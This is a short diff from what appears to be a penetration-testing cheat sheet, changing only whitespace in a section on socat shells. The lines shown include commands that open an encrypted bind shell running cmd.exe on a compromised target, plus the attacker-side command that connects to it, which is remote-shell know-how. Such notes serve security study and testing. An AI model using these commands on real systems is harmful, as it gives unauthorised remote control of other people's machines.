@@ -85,7 +85,7 @@ right: compromised target
 `socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes`: connect back  
 Bind shell  
 Target:
-`socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes`
+`socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes`  
 Attacker:
 `socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 -`
 
